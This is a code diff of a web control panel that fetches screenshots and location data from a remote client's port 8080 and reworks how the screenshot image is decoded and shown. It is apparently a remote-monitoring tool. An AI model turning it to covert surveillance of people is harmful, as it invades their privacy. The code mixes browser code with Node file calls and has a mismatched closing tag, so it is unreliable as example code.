@@ -18,7 +18,7 @@
                     <tr>
                         <th>Get Screenshot</th>
                         <th><button type='button' class='btn btn-success' onclick='get("http://{{clientip}}:8080/screen", "screenshot")'>GET</button></th>
-                        <th><div id='screenshot'></div></th>
+                        <th><img id='screenshot' src=''/></div></th>
                     </tr>
                     <tr>
                         <th>Get Current Location</th>
@@ -116,27 +116,46 @@
     }
 
     function get(url, id) {
-        if (url.includes('/screen')) {
-            
-        }
         var isScreen = url.includes('/screen');
         $.ajax({
             url: url,
             type: 'GET',
-            dataType: isScreen ? 'image/jpeg' : 'json',
-            success: function (data) {
-                console.log("Ajax response:", data);
+            beforeSend: function (xhr) {
+                xhr.overrideMimeType('text/plain; charset=x-user-defined');
+            },
+            dataType: isScreen ? null : 'json',
+            async: true,
+            success: function (result, textStatus, jqXHR) {
                 if (isScreen) {
-                    img = new Image();
-                    img.src = data;
-                    $('#' + id).append(img);
+                    if (result.length < 1) {
+                        $('#' + id).attr('src', 'data:image/png;base64,');
+                        return;
+                    }
+                    var binary = "";
+                    var responseText = jqXHR.responseText;
+                    var responseTextLen = responseText.length;
+                    for ( i = 0; i < responseTextLen; i++ ) {
+                        binary += String.fromCharCode(responseText.charCodeAt(i) & 255)
+                    }
+                    var data = binary.replace(/^data:image\/\w+;base64,/, "");
+                    var buf = new Buffer(data, 'base64');
+                    fs.writeFile('image.png', buf);
+                    $('#' + id).attr('src', 'data:image/png;base64,' + btoa(binary));
                 } else {
-                    $('#' + id).text(JSON.stringify(data, null, 2));
+                    $('#' + id).text(JSON.stringify(result, null, 2));
                 }
             },
-            error: function (error) {
-                console.log("Error:", error);
-            }
+            error: function(xhr, textStatus, errorThrown) {
+                console.error('Error:', textStatus);
+                console.error('Error Thrown:', errorThrown);
+            } 
+        });
+    }
+    function blobToDataUrl(blob) {
+        return new Promise(resolve => {
+            const reader = new FileReader();    // https://developer.mozilla.org/en-US/docs/Using_files_from_web_applications
+            reader.onload = e => resolve(e.target.result);
+            reader.readAsDataURL(blob);
         });
     }
 </script>
